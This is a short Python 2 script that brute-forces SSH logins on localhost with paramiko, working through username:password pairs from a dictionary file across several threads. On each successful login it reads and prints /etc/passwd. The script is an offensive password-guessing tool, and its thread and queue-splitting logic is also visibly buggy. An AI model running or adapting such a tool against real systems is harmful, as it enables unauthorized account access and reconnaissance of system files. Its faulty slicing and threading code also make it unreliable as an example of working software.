import paramiko
import threading,Queue
import sys

gLock= threading.Lock()
threadrange = 10
queue = Queue.Queue()

def getDict(dictio):
	i = 0
	cred_pairs = []

	fd = open(dictio,"r")
	for line in fd.readlines():
		
		pair = line.strip().split(':')
		cred_pairs.append(pair)
		i += 1
	fd.close()
	
	if i>=20:
		threadrange = i/20
	
		for x in xrange(threadrange):

			print "### Thread {0} started ###".format(x)
			PWSetter().start()	
	
		try:
			for k in range(0,threadrange-1):
			
				queue.put(cred_pairs[0+(k*1):(k*20)-1])
			queue.put(cred_pairs[(k*20):])
		except:
			gLock.acquire()
			print "### Queue is full ###"
			gLock.release()	
		
		gLock.acquire()
		print "### Waiting for threads to finish ###"
		gLock.release()
		queue.join()	

	else:
		print "### Only one Thread started ###"
		PWSetter().start()
		k = 0
		queue.put(cred_pairs[(k*20):])
		queue.join()
				

class PWSetter(threading.Thread):


	def run(self):
		ssh = paramiko.SSHClient()

		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

		while 1:
			try:
				dicts = queue.get(True,1)

				for user_pass in dicts[0:]:

					try:
						ssh.connect('localhost', username=user_pass[0], password=user_pass[1])

					except paramiko.AuthenticationException:
						print '#-# Username %s and Password %s is Incorrect #-#' %(user_pass[0],user_pass[1])

					else:	
						print '#+# Username %s and Password %s is Correct #+#' %(user_pass[0],user_pass[1])

						stdin, stdout, stderr = ssh.exec_command('cat /etc/passwd')
											
						for line in stdout.readlines():
							print line.strip()
					ssh.close()
				queue.task_done()
			except:
				break

if __name__ == '__main__':

	getDict(sys.argv[1])

			 

							 
